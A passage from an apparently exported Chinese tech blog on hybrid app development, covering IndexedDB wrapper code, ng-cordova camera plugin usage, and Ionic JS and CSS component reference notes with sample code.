打开数据库成功的回调函数 dbContent.onsuccess = function (e) &#123; // 5、增删改查操作，开启事物，每次只能做一件事情 var _db = e.target.result; // 创建事物 var trans = _db.transaction(["cart"], "readwrite"); // 用事物获取表 var store = trans.objectStore("cart"); // 虽然可以在一次成功打开请求的操作中同时操作多次增删改查命令，但是不推荐，以为这样前面的操作就不能被监听到了 // 增加数据 var req = store.add(&#123; goodsId: 'df6', prise: 12.3, name: "衣服", size: "M", age: 99 &#125;) // 修改数据 // var req = store.put(&#123; // goodsId: 'df6', // prise: 12.79, // name: "衣服", // size: "L", // age: 1000 // &#125; // 删除数据 // var req = store.delete("df6"); // 查询数据 // var req = store.get("df1"); // 删除所有数据 // var req = store.clear(); // 数据操作成功回调函数 // req.onsuccess = function(e)&#123; // console.log('数据操作成功了'); // &#125; // 数据添加失败回调函数 // req.onerror = function(e)&#123; // console.log('数据操作失败了'); // &#125; // 查询所有数据（用了游标） var cursor = store.openCursor(); var data = []; cursor.onsuccess = function(e)&#123; var result = e.target.result; if (result &amp;&amp; result !== null) &#123; data.push(result.value); // 重新执行 onsuccess 句柄，必须得写这句 result.continue(); &#125; console.log(data); &#125;; cursor.onerror = function()&#123; &#125; &#125;; // 打开数据库请求失败的回调函数 dbContent.onerror = function (e) &#123; console.log(3); &#125;&lt;/script&gt;&lt;/body&gt;&lt;/html&gt; 封装代码： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121angular.module('indexeddb', []).factory('IndexeddbJs', ['$ionicPopup',function ($ionicPopup) &#123; window.indexedDB = window.indexedDB || window.mozIndexedDB || window.webkitIndexedDB || window.msIndexedDB; window.IDBTransaction = window.IDBTransaction || window.webkitIDBTransaction || window.msIDBTransaction; window.IDBKeyRange = window.IDBKeyRange || window.webkitIDBKeyRange || window.msIDBKeyRange; window.IDBCursor=window.IDBCursor||window.webkitIDBCursor|| window.msIDBCursor; var db=&#123; dbName: 'aptdb', dbVersion: 2089, //用小数会四舍五入 dbInstance: &#123;&#125;, errorHandler: function (error) &#123; console.log('error: ' + error.target.error.message); &#125;, // 打开数据库连接 open: function (func, fail) &#123; var dbContent = window.indexedDB.open(db.dbName, db.dbVersion); // 数据库打开请求的跟新回调函数 dbContent.onupgradeneeded = db.upgrade; // 数据库打开请求的失败回调函数 dbContent.onerror = db.errorHandler; // 数据库打开请求的成功回调函数 dbContent.onsuccess = function (e) &#123; db.dbInstance = dbContent.result; db.dbInstance.onerror = fail; func(); &#125;; &#125;, // 数据库版本跟新操作 upgrade: function (e) &#123; var _db = e.target.result,names = _db.objectStoreNames; // 此处可以创建多个表 var name = "cart"; if (!names.contains(name)) &#123; // 创建表 _db.createObjectStore( name, &#123; keyPath: 'goodsId', autoIncrement: false &#125;); &#125; &#125;, // 获取表对象 getObjectStore: function (objectStoreName, mode) &#123; var txn, store; mode = mode || 'readonly'; txn = db.dbInstance.transaction([objectStoreName], mode); store = txn.objectStore(objectStoreName); return store; &#125;, // 增加数据方法 add: function (objectStoreName, data, success, fail) &#123; db.open(function () &#123; var store, req, mode = 'readwrite'; store = db.getObjectStore(objectStoreName, mode); req = store.add(data); req.onsuccess = success; req.onerror=fail; &#125;,fail); &#125;, // 修改数据方法 update: function (objectStoreName, data, success, fail) &#123; db.open(function () &#123; var store, req, mode = 'readwrite'; store = db.getObjectStore(objectStoreName,mode); req = store.put(data); req.onsuccess = success; req.onerror=fail; &#125;,fail); &#125;, // 获取全部数据方法 getAll: function (objectStoreName, success, fail) &#123; db.open(function () &#123; var store = db.getObjectStore(objectStoreName), cursor = store.openCursor(), data = []; cursor.onsuccess = function (e) &#123; var result = e.target.result; if (result &amp;&amp; result !== null) &#123; data.push(result.value); result.continue(); &#125; else &#123; success(data); &#125; &#125;; cursor.onerror=fail; &#125;,fail); &#125;, // 获取单条数据方法 get: function (id, objectStoreName, success, fail) &#123; db.open(function () &#123; var store = db.getObjectStore(objectStoreName), req = store.get(id); req.onsuccess = function (e)&#123; success(e.target.result); &#125;; req.onerror=fail; &#125;); &#125;, // delete是保留字 // 删除数据方法 'delete': function (id, objectStoreName, success, fail) &#123; db.open(function () &#123; var mode = 'readwrite', store, req; store = db.getObjectStore(objectStoreName, mode); req = store.delete(id); req.onsuccess = success; req.onerror=fail; &#125;); &#125;, // 删除表数据方法 deleteAll: function (objectStoreName, success, fail) &#123; db.open(function () &#123; var mode, store, req; mode = 'readwrite'; store = db.getObjectStore(objectStoreName, mode); req = store.clear(); req.onsuccess = success; req.onerror=fail; &#125;); &#125; &#125;; return db;&#125;]); ng-cordova官网http://ngcordova.com/docs/ 使用步骤下载 ng-cordova 的js文件 在项目根目录下面打开命令窗口，输入 1$ bower install ngCordova -save 在index.html文件中引入 ng-cordova.js 文件 在app.js(项目入口中)引入依赖 1angular.module('myApp', ['ngCordova']); 在 $ionicPlatform.ready 事件中使用插件功能，就是开始使用我们的插件 下载相应功能的插件，按照官方文档使用就可以了 在项目根目录下面打开命令窗口 1cordova plugin add [插件名称] 比如： 1cordova plugin add cordova-plugin-camera 调用手机摄像头功能保存头像调用 actionsheet 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091929394959697// 我的页面angular.module('account.controller', ['account.service']) .controller('AccountCtrl', function ($scope, $window, AccountFty, $ionicPopup, $ionicActionSheet, $cordovaCamera) &#123; // 在每次进入控制器的时候检查 localstorage 是否有头像的数据，如果有，把数据赋值给图片 img 的 src 属性 if (localStorage["touxiang"]) &#123; var image = document.getElementById('touxiang'); image.src = "data:image/jpeg;base64," + localStorage["touxiang"]; &#125; // 调用摄像头功能 $scope.func_showAction = function () &#123; // 显示操作表 $ionicActionSheet.show(&#123; buttons: [ &#123;text: '照相机'&#125;, &#123;text: '图库'&#125; ], titleText: '请选择文件源', cancelText: '取消', buttonClicked: function (index) &#123; switch (index) &#123; case 0: func_getPicFromCamera(); break; case 1: func_getPicFromPicture(); break; &#125; return true; &#125; &#125;); &#125;; // 从摄像头获取图片 var func_getPicFromCamera = function () &#123; var options = &#123; quality: 100, destinationType: Camera.DestinationType.DATA_URL, sourceType: Camera.PictureSourceType.CAMERA, allowEdit: true, encodingType: Camera.EncodingType.JPEG, targetWidth: 100, targetHeight: 100, popoverOptions: CameraPopoverOptions, saveToPhotoAlbum: false, correctOrientation: true &#125;; $cordovaCamera.getPicture(options).then(function (imageData) &#123; // 获取页面中的img对象 var image = document.getElementById('touxiang'); image.src = "data:image/jpeg;base64," + imageData; // 保存我们获取的头像数据，下次登录的时候就可以显示了吧 localStorage["touxiang"] = imageData; &#125;, function (err) &#123; //$scope.AlertPopup(err); &#125;); &#125;; // 从图库获取图片 var func_getPicFromPicture = function () &#123; var options = &#123; quality: 100, destinationType: Camera.DestinationType.DATA_URL, sourceType: Camera.PictureSourceType.PHOTOLIBRARY, allowEdit: true, encodingType: Camera.EncodingType.JPEG, targetWidth: 100, targetHeight: 100, popoverOptions: CameraPopoverOptions, saveToPhotoAlbum: false, correctOrientation: true &#125;; $cordovaCamera.getPicture(options).then(function (imageData) &#123; // 获取页面中的 img 标签 var image = document.getElementById('touxiang'); image.src = "data:image/jpeg;base64," + imageData; localStorage["touxiang"] = imageData; &#125;, function (err) &#123; //$scope.AlertPopup(err); &#125;); &#125;; // 打电话 $scope.func_callPhone = function (number) &#123; $window.location.href = "tel:" + number; &#125;; // 退出方法 $scope.func_exitApp = function () &#123; var confirmPopup = $ionicPopup.confirm(&#123; title: '提示', template: "确认退出？" &#125;); confirmPopup.then(function (res) &#123; if (res) &#123; // 退出 app ionic.Platform.exitApp(); &#125; &#125;); &#125; &#125;); 注意点： 一定要把 common.css 中的关于 actionsheet 的样式给加载进去，否则样式打包之后会错乱 怎么调用 cordova-camara 插件 http://my.oschina.net/u/1416844/blog/491533 常见问题 这个时候你需要运行: Base64文件介绍 http://www.aimks.com/css-path-data-image-png-usage-base64.htmlhttp://www.zhihu.com/question/36306744/answer/71626823 白名单设置页面代码1&lt;a class="telephone" href="tel:88889999"&gt;88889999&lt;/a&gt; 设置白名单http://rickluna.com/wp/2012/02/making-a-phone-call-from-within-phonegap-in-android-and-ios/ app图标在项目的根目录下创建 resources 文件夹。 在文件夹中都放入 icon.png（应用图标，最小 192x192px，不带圆角），splash.png（启动屏幕，最小 2208x2208px，中间区域 1200x1200px ）(可以是 png、psd、ai) 在 cmd 中进入项目所在文件夹执行：必须联网 12ionic resources --icon ionic resources --splash 项目中的config文件中是这样 12345678910111213&lt;platform name="android"&gt; &lt;icon src="resources\android\icon\drawable-ldpi-icon.png" density="ldpi"/&gt; &lt;icon src="resources\android\icon\drawable-mdpi-icon.png" density="mdpi"/&gt; &lt;icon src="resources\android\icon\drawable-hdpi-icon.png" density="hdpi"/&gt; &lt;icon src="resources\android\icon\drawable-xhdpi-icon.png" density="xhdpi"/&gt; &lt;icon src="resources\android\icon\drawable-xxhdpi-icon.png" density="xxhdpi"/&gt; &lt;splash src="resources\android\splash\drawable-land-ldpi-screen.png" density="land-ldpi"/&gt; &lt;splash src="resources\android\splash\drawable-land-mdpi-screen.png" density="land-mdpi"/&gt; &lt;splash src="resources\android\splash\drawable-port-ldpi-screen.png" density="port-ldpi"/&gt; &lt;splash src="resources\android\splash\drawable-port-mdpi-screen.png" density="port-mdpi"/&gt; &lt;splash src="resources\android\splash\drawable-port-hdpi-screen.png" density="port-hdpi"/&gt;&lt;/platform&gt;&lt;icon src="resources\android\icon\drawable-xhdpi-icon.png"/&gt; 因为在运行的时候要上传图片，所以需要联网不错的插件 双击退出应用实现思路 $cordovaToast$ionicPlatform.registerBackButtonAction$location.path 判断时候是第一次进入应用 其他平台介绍P++支付平台极光推送平台微信开发平台 项目优化使用gulp压缩源代码 插件扩展 http://git.oschina.net/Cheergoal/BarcodeScanner http://cordova.apache.org/docs/en/latest/guide/hybrid/plugins/index.html http://www.iteye.com/blogs/subjects/cordova http://www.oschina.net/question/2296277_232018 angular，ui-router，indexdb，swiper, 媒体查询，rem，cordova，ng-cordova，Promise/A+ css3, scss, gulp]]></content>
      <categories>
        <category>Hybrid APP 开发系列</category>
      </categories>
      <tags>
        <tag>AngularJS</tag>
        <tag>ionic</tag>
        <tag>cordova</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ionic js笔记]]></title>
    <url>%2F2017%2F09%2F09%2Fionic%20js%E7%AC%94%E8%AE%B0%2F</url>
    <content type="text"><![CDATA[什么是 Ionic JSionic 对 AngularJS 进行了扩展，主要就是将移动端开发中常见的 UI 组件抽象成 AngularJS 的指令，便于我们在开发中快速构建应用界面。 视图导航ion-nav-view在 ionic 里，我们使用 ion-nav-view 指令代替 AngularUI Route 中的 ui-view 指令，来进行模板的渲染： 12&lt;ion-nav-view&gt;&lt;/ion-nav-view&gt; ion-view相当于一个 div 里面多了很多属性。 cache-view - 是否对这个模板视图进行缓存 允许值为：true | false，默认为true 123&lt;ion-view&gt; ...&lt;/ion-view&gt; 基本布局Ion-header-bar12345&lt;ion-view&gt; &lt;ion-header-bar class="title"&gt;头部区域&lt;/ion-header-bar&gt; &lt;ion-content&gt;内容区域&lt;/ion-content&gt; &lt;ion-footer-bar&gt;底部&lt;/ion-footer-bar&gt; &lt;/ion-view&gt; ion-header-bar 指令有两个可选的属性： align-title - 设置标题文字的对齐方式。允许值：left | right | center，默认 center。no-tap-scroll - 当点击标题时是否将内容区域自动滚动到最开始。允许值：true | false，默认为 true。 ion-footer-bar1&lt;ion-footer-bar&gt;...&lt;/ion-footer-bar&gt; ion-footer-bar指令有一个可选的属性： align-title - 设置标题文本的对齐方式。允许值：left | right | center 。 ion-content1&lt;ion-content&gt;...&lt;/ion-content&gt; ion-content占据 header 和 footer 以外的剩余区域。当内容超过可视区域时，ion-content 可以滚动以显示被隐藏的部分。默认 ionic 自定制的滚动视图，可以使用 overflow-scroll 属性设置使用系统内置的滚动条。 选项卡语法12345&lt;ion-tabs&gt; &lt;ion-tab title="..."&gt;...&lt;/ion-tab&gt; &lt;ion-tab title="..."&gt;...&lt;/ion-tab&gt; ...&lt;/ion-tabs&gt; 注意： 不要把 ion-tabs 指令放在 ion-content 之内ion-tab 的内容应当放入 ion-view 指令内，否则 ionic 在计算布局时可能出错 脚本接口：$ionicTabsDelegate select(index) - 选中指定的选项页 index参数从0开始，第一个选项页的index为0，第二个为1，依次类推。 selectedIndex() - 返回当前选中选项页的索引号 如果当前没有选中的选项页，则返回 -1。 列表语法列表是常用的信息组织方式 12345&lt;ion-list&gt; &lt;ion-item&gt;...&lt;/ion-item&gt; &lt;ion-item&gt;...&lt;/ion-item&gt; ...&lt;/ion-list&gt; 属性 type - 列表种类 type 属性是可选的，可用来设置列表的种类： list-inset | card。这两种列表都产生内嵌的效果，区别在于card列表有边框的阴影效果。 show-delete - 是否显示成员内的delete按钮 show-delete 属性是可选的。如果在成员内有 delete 按钮（ion-delete-button），使用这个属性来通知列表是否显示元素删除按钮。允许的值为：true | false。 show-reorder - 是否显示成员内的reorder按钮 show-reorder 属性是可选的。如果在成员内有reorder按钮（ion-reorder-button），使用这个属性来通知列表是否显示元素重排序按钮。允许的值为：true | false can-swipe - 是否支持滑动方式显示成员option按钮 can-swipe 属性是可选的。如果在成员内有option按钮（ion-option-button），使用这个属性来允许或禁止通过向左滑动成员来打开option按钮。允许的值为：true | false ，默认为true。 成员按钮 ion-option-button - 选项按钮。 一个ion-item内可以包含多个选项按钮。选项按钮是隐藏的，需要用户向左 滑动成员，以显示选项按钮。可以使用ion-tabs的can-swipe属性允许或禁止 滑动开启选项按钮。 ion-delete-button - 删除按钮 一个ion-item内最多有一个删除按钮。删除按钮在显示时总是位于成员的最 左端。可以使用ion-tabs的show-delete属性显示或隐藏删除按钮 ion-reorder-button - 重排按钮 一个ion-item内最多有一个重排按钮。重排按钮在显示时总是位于成员的最 右端。可以使用ion-tabs的show-reorder属性显示或隐藏重排按钮 API : $ionicListDelegate如果需要从脚本中控制列表元素，可以使用$ionicListDelegate服务： showReorder([showReorder]) - 显示/关闭排序按钮 showReorder的允许值为：true | false。可以使用一个作用域上的表达式 showDelete([showDelete]) - 显示/关闭删除按钮 showDelete的允许值为： true | false。可以使用一个作用域上的表达式 canSwipeItems([canSwipeItems]) - 是否允许通过滑动方式来显示成员选项按钮 canSwipeItems的允许值为：true | false。可以使用一个作用域上的表达式 closeOptionButtons() - 关闭所有选项按钮 表单输入复选按钮: ion-checkbox1&lt;ion-checkbox&gt;...&lt;/ion-checkbox&gt; 1、使用 ion-checkbox 指令声明复选按钮元素： 与标准的checkbox相比，使用ionic的ion-checkbox有几个优势：样式更美观，与移动端的UI更匹配支持数据绑定。使用可选的ng-model属性，可以直接将选中状态绑定到作用域上的变量直接使用文本子元素作为标签 2、也可以使用 ng-checked 进行手动的状态选定 单选按钮:ion-radio1&lt;ion-radio&gt;...&lt;/ion-radio&gt; 和 HTML 的 radio 相比，ion-radio 的改进也是明显的： 1、与移动端的 UI 更匹配2、使用可选的 ng-model 属性，实现与作用域变量的数据绑定3、使用可选的 ng-value 属性，可以使用作用域变量设置单选按钮对应的值 开关按钮:ion-toggle1&lt;ion-toggle&gt;&lt;/ion-toggle&gt; ion-toggle 有两个可选的属性： ng-model - 模型变量 和复选按钮一样，开关按钮也可以使用可选的ng-model属性实现与作用域变量 的双向绑定。 toggle-class - 样式类 可以使用可选的 toggle-class 属性为开关按钮声明额外的样式。比如：toggle-{color} 用来声明配色方案。 效果图 代码controller.js 123$scope.select = &#123; select: ''&#125; html 页面 1234567891011121314151617181920212223&lt;ion-view&gt; &lt;ion-header-bar align-title="center" class="royal-bg bar bar-header "&gt;头部区域&lt;/ion-header-bar&gt; &lt;ion-content class="light-bg"&gt; &lt;ion-list&gt; &lt;ion-item&gt; 类似于 QQ 的功能 &lt;ion-option-button class="assertive-bg"&gt;删除&lt;/ion-option-button&gt; &lt;ion-option-button class="balanced-bg"&gt;添加&lt;/ion-option-button&gt; &lt;/ion-item&gt; &lt;ion-item&gt;复选按钮的状态是：&#123;&#123;ck&#125;&#125; &lt;br/&gt;&lt;br/&gt; &lt;ion-checkbox ng-model="ck"&gt;复选按钮&lt;/ion-checkbox&gt; &lt;/ion-item&gt; &lt;ion-item&gt;开关的状态是：&#123;&#123;tg&#125;&#125; &lt;br/&gt;&lt;br/&gt; &lt;ion-toggle ng-model="tg"&gt;开关&lt;/ion-toggle&gt; &lt;/ion-item&gt; &lt;ion-item&gt;单选按钮的选中值是：&#123;&#123;select.select&#125;&#125; &lt;br/&gt;&lt;br/&gt; &lt;ion-radio ng-repeat="item in data" ng-model="select.select" ng-value="item.value"&gt;&#123;&#123;item.name&#125;&#125;&lt;/ion-radio&gt; &lt;/ion-item&gt; &lt;ion-item&gt;列表4&lt;/ion-item&gt; &lt;/ion-list&gt; &lt;/ion-content&gt; &lt;ion-footer-bar class="dark-bg"&gt;底部&lt;/ion-footer-bar&gt;&lt;/ion-view&gt; 幻灯片语法12345&lt;ion-slide-box&gt;&lt;ion-slide&gt;...&lt;/ion-slide&gt;&lt;ion-slide&gt;...&lt;/ion-slide&gt;...&lt;/ion-slide-box&gt; 属性 does-continue - 是否循环切换 开头的幻灯页只能向左滑动，最后的幻灯页只能向右滑动。 将does-continue属性值设为true，就可以让幻灯页组首尾连接起来，循环切换。 auto-play - 是否自动播放 通过将auto-play属性设置为true，可以让幻灯页自动切换。切换的间隔默认是4000ms，可以 通过属性slide-interval进行调整。 slide-interval - 自动播放的间隔时间，默认为4000msshow-pager - 是否显示分页器 分页器用来指示幻灯页的选中状态，位于幻灯片的底部。 允许值为：true | false 方法事件 pager-click - 分页器点击事件pager-click 属性应当设置为一个当前作用域上的函数调用表达式，这个函数将被 传入被点击的分页按钮对应的幻灯页序号：indexon-slide-changed - 幻灯页切换事件on-slide-changed属性应当设置为一个当前作用域上的函数调用表达式，这个函数 将被传入当前幻灯页的序号：$indexactive-slide - 当前幻灯页索引active-slide 属性应当设置为一个当前作用域上的变量，当幻灯片切换时，这个变 量同步的反应当前的幻灯页索引号 API:$ionicSlideBoxDelegate update() - 重绘幻灯片 有时，比如当容器尺寸发生变化时，需要调用update()方法重绘幻灯片。 slide(to[,speed]) - 切换到指定幻灯页 参数to表示切换的目标幻灯页序号，参数speed是可选的，表示以毫秒 为单位的切换时间 previous() - 切换到前一张幻灯页next() - 切换到后一张幻灯页currentIndex() - 获得当前幻灯页的序号slideCount() - 获得全部幻灯页的数量 动态组件模态对话框:$ionicModal模态对话框常用来供用户进行选择或编辑，在模态对话框关闭之前，其他 的用户交互行为被阻止。 在ionic中使用模态对话框有三个步骤： 1、声明对话框模板使用ion-modal-view指令声明对话框模板，对话框模板通常置入 script 内以构造内联模板： 12345&lt;script id="a.html" type="text/ng-template"&gt; &lt;ion-modal-view&gt; &lt;!--对话框内容--&gt; &lt;/ion-modal-view&gt;&lt;/script&gt; 2、创建对话框对象服务$ionicModal有两个方法用来创建对话框对象： fromTemplate(templateString,options) - 使用字符串模板fromTemplateUrl(templateUrl,options) - 使用内联模板 这两个方法返回的都是一个对话框对象。 3、操作对话框对象对象框对象有以下方法用于显示、隐藏或删除对话框： show() - 显示对话框hide() - 隐藏对话框remove() - 移除对话框isShown() - 对话框是否可视？ 4、js代码123456789101112131415161718192021222324252627angular.module('testApp', ['ionic']).controller('MyController', function($scope, $ionicModal) &#123; $ionicModal.fromTemplateUrl('modal.html', &#123; scope: $scope, animation: 'slide-in-up' &#125;).then(function(modal) &#123; $scope.modal = modal; &#125;); $scope.openModal = function() &#123; $scope.modal.show(); &#125;; $scope.closeModal = function() &#123; $scope.modal.hide(); &#125;; //当我们用到模型时，清除它！ $scope.$on('$destroy', function() &#123; $scope.modal.remove(); &#125;); // 当隐藏的模型时执行动作 $scope.$on('modal.hide', function() &#123; // 执行动作 &#125;); // 当移动模型时执行动作 $scope.$on('modal.removed', function() &#123; // 执行动作 &#125;);&#125;); 上拉菜单:$ionicActionSheet1、定义上拉菜单选项 菜单属性： titleText - 上拉菜单的标题文本buttons - 自定义按钮数组。每个按钮需要一个描述对象，其text字段用于按钮显示cancelText - 取消按钮的文本。如果不设置此字段，则上拉菜单中不出现取消按钮destructiveText - 危险选项按钮的文本。如果不设置此字段，则上拉菜单中不出现危险选项按钮buttonClicked - 自定义按钮的回调函数，当用户点击时触发cancel - 取消按钮回调函数，当用户点击时触发destructiveButtonClicked - 危险选项按钮的回调函数，当用户点击时触发cancelOnStateChange - 当切换到新的视图时是否关闭此上拉菜单。默认为truecssClass - 附加的CSS样式类名称 2、创建上拉菜单 $ionicActionSheet 服务的 show() 方法用来创建上拉菜单，返回一个函数，调用该 返回函数可以关闭此菜单。 3、代码 1234567891011121314151617181920212223242526angular.module('mySuperApp', ['ionic']) .controller(function($scope, $ionicActionSheet) &#123; // 点击按钮触发，或一些其他的触发条件 $scope.show = function() &#123; // 显示操作表 $ionicActionSheet.show(&#123; buttons: [ &#123; text: '&lt;b&gt;Share&lt;/b&gt; This' &#125;, &#123; text: 'Move' &#125;, ], destructiveText: 'Delete', titleText: 'Modify your album', cancelText: 'Cancel', buttonClicked: function(index) &#123; switch (index) &#123; case 0: console.log('相机'); break; case 1: console.log('图库'); break; &#125; return true; &#125; &#125;); &#125;; &#125;); 弹出框:$ionicPopup语法： 1234$ionicPopup.show(options).then(function()&#123; //这个函数在弹出框关闭时被调用&#125;); 简化的特定弹出框： alert(options) - 警告弹出框，仅包含一个按钮供关闭弹出框confirm(options) - 确认弹出框，包含一个取消按钮和一个确认按钮prompt(options) - 输入提示弹出框，包含一个文本输入框、一个取消 js代码 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859angular.module('mySuperApp', ['ionic']).controller(function($scope, $ionicPopup, $timeout) &#123; // 触发一个按钮点击，或一些其他目标 $scope.showPopup = function() &#123; $scope.data = &#123;&#125; // 一个精心制作的自定义弹窗 var myPopup = $ionicPopup.show(&#123; template: '&lt;input type="password" ng-model="data.wifi"&gt;', title: 'Enter Wi-Fi Password', subTitle: 'Please use normal things', scope: $scope, buttons: [ &#123; text: 'Cancel' &#125;, &#123; text: '&lt;b&gt;Save&lt;/b&gt;', type: 'button-positive', onTap: function(e) &#123; if (!$scope.data.wifi) &#123; //不允许用户关闭，除非他键入wifi密码 e.preventDefault(); &#125; else &#123; return $scope.data.wifi; &#125; &#125; &#125;, ] &#125;); myPopup.then(function(res) &#123; console.log('Tapped!', res); &#125;); $timeout(function() &#123; myPopup.close(); //由于某种原因3秒后关闭弹出 &#125;, 3000); // 一个确认对话框 $scope.showConfirm = function() &#123; var confirmPopup = $ionicPopup.confirm(&#123; title: 'Consume Ice Cream', template: 'Are you sure you want to eat this ice cream?' &#125;); confirmPopup.then(function(res) &#123; if(res) &#123; console.log('You are sure'); &#125; else &#123; console.log('You are not sure'); &#125; &#125;); &#125;; // 一个提示对话框 $scope.showAlert = function() &#123; var alertPopup = $ionicPopup.alert(&#123; title: 'Don\'t eat that!', template: 'It might taste good' &#125;); alertPopup.then(function(res) &#123; console.log('Thank you for not eating my delicious ice cream cone'); &#125;); &#125;; &#125;;&#125;); 浮动框：$ionicPopover浮动框通常用以非侵入的方式提供当前视图的额外信息。 在 ionic 中使用浮动框的几个步骤： 1.声明模板 需要首先利用 ion-popover-view 指令声明一个模板内容： 123&lt;ion-popover-view&gt; &lt;!--模板内容--&gt;&lt;/ion-popover-view&gt; 2.创建浮动框对象 使用$ion-popover服务的以下方法创建浮动框对象： fromTemplate(templateString,options) - 使用模板字符串构造浮动框fromTemplateurl(templateUrl,options) - 使用内联模板构造浮动框 注意：这两个方法返回的都是promise对象，在浮动框对象被构造 成功后得到解析，这时可以获取浮动框对象： 1234$ionicPopover.fromTemplate(...) .then(function(popover)&#123; //popover参数是浮动框对象&#125;); 3.操作浮动框对象 浮动框对象提供以下方法： show() - 显示浮动框hide() - 关闭浮动框remove() - 移除浮动框isShown() - 浮动框是否处于显示状态？ 4.代码 页面部分 12345&lt;script id="ez-popover.html" type="text/ng-template"&gt; &lt;ion-popover-view class="calm-bg light padding"&gt; &lt;p&gt;这里应该有些帮助信息....&lt;/p&gt; &lt;/ion-popover-view&gt;&lt;/script&gt; 控制器部分 123456789101112131415161718192021222324252627angular.module("ezApp", ["ionic"]).controller("ezCtrl", function($scope, $ionicPopover) &#123; $ionicPopover.fromTemplateUrl("ez-popover.html", &#123; scope: $scope &#125;) .then(function(popover)&#123; $scope.popover = popover; &#125;) $scope.openPopover = function($event) &#123; $scope.popover.show($event); &#125;; $scope.closePopover = function() &#123; $scope.popover.hide(); &#125;; //销毁事件回调处理：清理popover对象 $scope.$on("$destroy", function() &#123; $scope.popover.remove(); &#125;); // 隐藏事件回调处理 $scope.$on("popover.hidden", function() &#123; // Execute action &#125;); //删除事件回调处理 $scope.$on("popover.removed", function() &#123; // Execute action &#125;);&#125;);]]></content>
      <categories>
        <category>Hybrid APP 开发系列</category>
      </categories>
      <tags>
        <tag>ionic</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ionic css笔记]]></title>
    <url>%2F2017%2F08%2F08%2Fionic%20css%E7%AC%94%E8%AE%B0%2F</url>
    <content type="text"><![CDATA[ionic Cssionic css是什么可以只使用 ionic 的 CSS 框架：直接在 HTML 中引入 ionic.css 就可以了。ionic 的 CSS 框架主要提供预定义的 CSS 类，来帮助我们快速构建适用于手机端的 UI。 Ionic css组成 基本布局类颜色和图标类界面组件类栅格系统类 布局定高条块定义.bar——将元素声明为屏幕上绝对定位的块状区域，具有固定的高度（44px） 条块位置.bar-header - 置顶.bar-subheader - header之下置顶.bar-footer - 置底.bar-subfooter - footer之上置底 内容.content - 流式定位，内容在文档流中按顺序定位.scroll-content - 绝对定位，内容元素占满整个屏幕 bar子元素有三种.bar子元素的样式是预定义的： 123&lt;any class="bar"&gt; &lt;any class="title"&gt;...&lt;/any&gt;&lt;/any&gt; 标题文字 - 对包含标题文字的元素应用 .title 样式，通常使用h1元素。 按钮 - 对用作按钮的元素，应用 .button 样式，通常使用 button 或 a 元素作为按钮。注意按钮将使用 .bar 的配色方案。 工具栏 - 工具栏包含一组按钮。对用作工具栏的元素，应用 .button-bar 样式，通常 使用 div 元素作为工具栏。 bar嵌入input在条块元素上应用 .item-input-inset 样式将input包裹在应用 .item-input-wrapper 样式的元素内 123456&lt;div class="bar bar-subheader light-bg item-input-inset"&gt; &lt;a class="button button-clear icon-right ion-android-arrow-dropdown"&gt;北京&lt;/a&gt; &lt;label class="item-input-wrapper"&gt; &lt;input type="text" placeholder="输入查询信息"&gt; &lt;/label&gt;&lt;/div&gt; 小结 颜色&amp;图标色彩ionic定义了九种前景/背景/边框的色彩样式： 123&lt;any class="positive-bg energized"&gt;...&lt;/any&gt; 图标官网地址：http://ionicons.com/ .icon - 将元素声明为图标.ion-{icon-name} - 声明要使用的具体图标 1&lt;any class="icon ion-ionic calm"&gt;&lt;/any&gt; 比如： 1&lt;button class="button button-light icon ion-bug"&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;bug&amp;nbsp;&amp;nbsp;&lt;/button&gt; 内边距ionic定义了常用的内边距样式： 样式名很直白，边距统一为10px。可以在任何元素上应用这些样式。 123&lt;any class="padding-top"&gt; .padding-top&lt;/any&gt; 列表样式列表使用.list定义列表容器， 使用.item定义列表成员： 123456&lt;any class="list"&gt; &lt;any class="item"&gt;...&lt;/any&gt; &lt;any class="item"&gt;...&lt;/any&gt; &lt;any class="item"&gt;...&lt;/any&gt; &lt;any class="item"&gt;...&lt;/any&gt;&lt;/any&gt; 成员项列表的样式定制主要发生在.item元素上。 按钮ionic使用.button样式定义按钮元素 开关开关通常用来设置两种状态 - 开启和关闭 123456789&lt;any class="item item-toggle"&gt; iMessage &lt;label class="toggle toggle-balanced"&gt; &lt;input type="checkbox"&gt; &lt;div class="track"&gt; &lt;div class="handle"&gt;&lt;/div&gt; &lt;/div&gt; &lt;/label&gt;&lt;/any&gt; 复选复选框通常用来在一组列表中选中部分成员 12345&lt;any class="item item-chexkbox"&gt; &lt;any class="checkbox"&gt; &lt;input type="checkbox"&gt; &lt;/any&gt;&lt;/any&gt; 单选12345&lt;label class="item item-radio"&gt; &lt;input type="radio" name="group"&gt; &lt;div class="item-content"&gt;f支付宝客户端支付&lt;/div&gt; &lt;i class="radio-icon ion-checkmark assertive"&gt;&lt;/i&gt;&lt;/label&gt; 单选按钮通常不单独使用，将他们放入一个列表中 12345&lt;any class="list"&gt; &lt;any class="item item-radio"&gt;...&lt;/any&gt; &lt;any class="item item-radio"&gt;...&lt;/any&gt; ...&lt;/any&gt; 滑动条12345&lt;any class="item range"&gt; &lt;any class="icon icon-volume-low"&gt;&lt;/any&gt; &lt;input type="range" name="volume"&gt; &lt;any class="icon icon-volume-high"&gt;&lt;/any&gt;&lt;/any&gt; 选择框12345678910&lt;any class=item item-select”&gt; &lt;label class="item-input"&gt; &lt;any class="input-label"&gt;&lt;/any&gt; &lt;select&gt; &lt;option&gt;...&lt;/option&gt; &lt;option&gt;...&lt;/option&gt; ... &lt;/select&gt; &lt;/label&gt;&lt;/any&gt; 选项卡选项卡是一个可以包含多个按钮或链接的容器，通常用于提供一致的导航体验。 ionic中使用.tabs样式声明选项卡，使用.tab-item样式声明选项卡 成员 12345&lt;any class=&quot;tabs&quot;&gt; &lt;any class=&quot;tab-item&quot;&gt;...&lt;/any&gt; &lt;any class=&quot;tab-item&quot;&gt;...&lt;/any&gt; ...&lt;/any&gt; 徽章使用 .badge 样式插入徽章元素在 .tab-item 同级声明 .has-badge 样式 123456&lt;any class="tabs"&gt;&lt;any class="tab-item has-badge"&gt; &lt;any 